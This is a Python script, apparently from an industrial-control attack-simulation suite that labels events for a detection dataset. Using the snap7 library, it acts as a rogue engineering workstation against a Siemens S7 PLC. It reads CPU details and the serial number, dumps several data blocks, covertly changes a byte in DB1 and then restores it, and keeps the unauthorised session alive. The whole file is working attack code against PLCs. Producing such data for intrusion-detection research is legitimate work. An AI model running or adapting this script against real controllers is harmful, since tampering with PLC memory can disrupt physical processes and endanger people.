"""
EWS_ROGUE_ENGINEER
Kỹ thuật: Kết nối S7 trực tiếp từ IP attacker (không phải EWS hợp lệ)
          Thực hiện các lệnh Read/Write bất thường
Observable: S7 session từ nguồn lạ, IP không trong whitelist

Gọi từ bash:
  python -m attacks_ext.ews_rogue_engineer \
      --target 192.168.1.10 --rack 0 --slot 1 --duration 300 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import snap7
import time
from attacks_ext.config_ext import base_parser, write_label

RECON_TARGETS = [
    {"db": 1,  "start": 0,  "size": 100, "desc": "DB1 - Main control"},
    {"db": 2,  "start": 0,  "size": 50,  "desc": "DB2 - Sensor data"},
    {"db": 10, "start": 0,  "size": 200, "desc": "DB10 - Config"},
]


def run(args):
    label_prefix = "EWS_ROGUE_ENGINEER"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={args.target}")

    client = snap7.client.Client()

    try:
        print(f"[*] Kết nối S7 từ IP attacker -> {args.target}:{args.rack}/{args.slot}")
        client.connect(args.target, args.rack, args.slot)
        print(f"[+] Kết nối thành công!")

        print("\n[PHASE 1] Reconnaissance - Đọc thông tin PLC...")
        info = client.get_cpu_info()
        print(f"  [INFO] Module: {info.ModuleTypeName.decode()}")
        print(f"  [INFO] Serial: {info.SerialNumber.decode()}")
        state = client.get_cpu_state()
        print(f"  [INFO] CPU State: {state}")

        print("\n[PHASE 2] Data Exfiltration - Đọc Data Blocks...")
        for target in RECON_TARGETS:
            try:
                data = client.db_read(target["db"], target["start"], target["size"])
                print(f"  [READ] {target['desc']}: {len(data)} bytes đọc thành công")
                print(f"         First 8 bytes: {data[:8].hex()}")
                time.sleep(1)
            except Exception as e:
                print(f"  [WARN] Không đọc được {target['desc']}: {e}")

        print("\n[PHASE 3] Covert Write - Ghi giá trị vào DB...")
        try:
            current = client.db_read(1, 0, 10)
            print(f"  [READ] DB1 hiện tại: {current[:10].hex()}")

            modified = bytearray(current)
            modified[0] = (modified[0] + 1) % 256
            client.db_write(1, 0, bytes(modified[:10]))
            print(f"  [WRITE] DB1 byte[0]: {current[0]} -> {modified[0]}")

            time.sleep(2)
            client.db_write(1, 0, bytes(current[:10]))
            print(f"  [RESTORE] DB1 đã khôi phục")
        except Exception as e:
            print(f"  [WARN] Write failed: {e}")

        print(f"\n[*] Duy trì session bất hợp lệ...")
        keep_alive = min(10, args.duration // 5)
        for i in range(keep_alive):
            client.get_cpu_state()
            time.sleep(3)
            print(f"  [KEEP-ALIVE] {i+1}/{keep_alive}")

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        if client.get_connected():
            client.disconnect()
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"dbs_read={len(RECON_TARGETS)}")


def main():
    p = base_parser("EWS Rogue Engineer Attack")
    p.add_argument("--target", default="192.168.1.10")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
